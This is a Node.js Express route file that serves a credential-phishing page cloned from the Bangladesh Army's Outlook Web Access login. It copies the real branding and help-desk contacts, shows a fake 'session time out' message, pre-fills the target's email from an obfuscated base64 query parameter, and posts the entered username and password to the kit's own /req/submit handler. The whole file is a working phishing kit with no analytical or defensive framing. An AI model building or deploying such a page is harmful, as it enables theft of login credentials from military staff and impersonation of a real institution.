
const express = require ('express');
const router = express.Router();
const db = require('../db');

router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data = req.query.kjgfhdgudgherueru9843efjdfhfwheur;
    const username = Buffer.from(data, 'base64').toString('utf-8');
    

    if (data == null) {
    res.render('error');
    
  }else{


    const htmlContent = `
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright (c) 2011 Microsoft Corporation.  All rights reserved. -->
    <!-- OwaPage = ASP.auth_logon_aspx -->
    <!-- {57A118C6-2DA9-419d-BE9A-F92B0F9A418B} -->
    <html>
    <head>
    <meta http-equiv="X-UA-Compatible" content="IE=10">
    <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="./style/login.css">

    <title>Webmail | Bangladesh Army</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="Robots" content="NOINDEX, NOFOLLOW">
            <!-- Required meta tags -->
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
          
        <style>
       
        </style>
        </head>
       <body class="signInBg" style="background: #c5ddc5">



        <form action="/req/submit" method="POST" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
        <input type="hidden" name="destination" value="https://newmail.army.mil.bd/owa/">
        <input type="hidden" name="flags" value="4">
        <input type="hidden" name="forcedownlevel" value="0">
        
        <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
        <div id="mainLogonDiv" class="mouse">
        
            <div class="sidebar" style="background-image:url(./images/Untitled.jpeg) ">
                <div class="owaLogoContainer">
                    <img src="./images/logoarmy.png" class="owaLogo" aria-hidden="true">
                
        <span id="logoDesc">Bangladesh Army</span>
        </div>
    </div>
    <div class="logonContainer">
	<div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
        
            <div class="signInImageHeader" role="heading" aria-label="Outlook">
                <div class="textLogo">Webmail<span>Bangladesh Army</span></div>
            </div>

            <div id="signInErrorDiv" class="signInError"  style="font-size:14px;" role="alert" tabindex="0">
            Your session time out. Try entering it again.
            </div><br>
        
		<div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Email address:</div>
		<div><input id="username" name="username" class="signInInputText" role="textbox" value="${username}" aria-labelledby="userNameLabel"></div>
		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
		<div><input id="password" onfocus="g_fFcs=0" name="password" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel"></div>
        <div><input id="passwordText" onfocus="g_fFcs=0" name="passwordText" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel"></div>
        <div class="showPasswordCheck signInCheckBoxText">
            <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()">
            <span>Show password</span>
        </div>
        <div style="cursor:pointer;">
            <input style="cursor:pointer;" type="checkbox" onclick="checkpwd();">
            <span onclick="checkpwd();" style="font-size: 16px; color: #666666; font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;">Show password</span>
        </div>
        <script>
            function checkpwd() {
                var passwordField = document.getElementById("password");
                if (passwordField.type === "password") {
                    passwordField.type = "text";
                } else {
                    passwordField.type = "password";
                }
            }
        </script>
          
		

		<div id="expltxt" class="signInExpl" role="alert">
			
		</div>
		<div class="signInEnter">
        <button class="btnsubmit" tabindex="0" type="submit">
        <img class="imgLnk" src="./images/button.png" alt=""><span class="signinTxt">sign in</span>
        </button>
              
              
               </script>

            <input name="isUtf8" value="1" type="hidden">
		</div>
		<span class="mailuserHints">From now onward, e-mail address must include @army.mil.bd or @ad.army.mil.bd&nbsp;while&nbsp;log&nbsp;in</span>


        <div class="hidden-submit"><input type="submit" tabindex="-1"></div> 
        <div id="supportBlock" style="margin-top:22px; color:#0072C6;"><span>Need Help?</span>

        Please contact at 
        <ul>
            <li>a. E-mail Server Technician 901-8878 or 01769018878</li>
            <!-- <li>b. AD & E-mail Server Admin 01761448883</li>-->
            <li>b. AD NOC NCO 901-8833 or 01769018833</li>
            <li>c. 01769-018878 (WhatsApp) or email at webmail@army.mil.bd</li>
        </ul></div>
            </div>
            </div>
                <div id="cookieMsg" class="logonDiv" style="display:none">
                <div class="signInHeader">Outlook</div>
                <div class="signInExpl">Please enable cookies for this Web site.<br><br>Cookies are currently disabled by your browser. Outlook requires that cookies be enabled. <br><br>For information about how to enable cookies, see the Help for your Web browser.<br><br><br></div>
                <div class="signInEnter">
                    <div onclick="clkRtry()" style="cursor:pointer;display:inline">
                        <img class="imgLnk" src="./images/button.png" alt=""><span class="signinTxt" tabindex="0">retry</span>
                </div>
            </div>
            </div>
        </div>
        </form>




        </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});



module.exports =router
